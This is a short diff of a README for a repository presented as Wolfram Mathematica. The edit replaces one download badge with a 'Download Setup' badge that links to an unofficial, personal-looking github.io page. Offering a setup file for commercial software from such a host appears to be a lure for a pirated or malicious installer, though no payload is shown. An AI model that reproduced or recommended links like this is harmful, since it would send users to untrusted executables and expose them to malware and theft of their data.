@@ -5,11 +5,7 @@
   <img src="https://software.sites.unc.edu/wp-content/uploads/sites/8/2014/12/Mathematica-8-logo.png" alt="Wolfram Mathematica Logo" width="200"/>
 </p>
 
-<p align="center">
-  <a href="https://wolfram-mathematica-software.github.io/.github">
-    <img src="https://img.shields.io/badge/⬇️_Get_Wolfram_Mathematica-blue?style=for-the-badge" alt="Get Wolfram Mathematica"/>
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://ashleykostiukmlmpn.github.io/.github/Mathematica-Software)
 
 ---
 
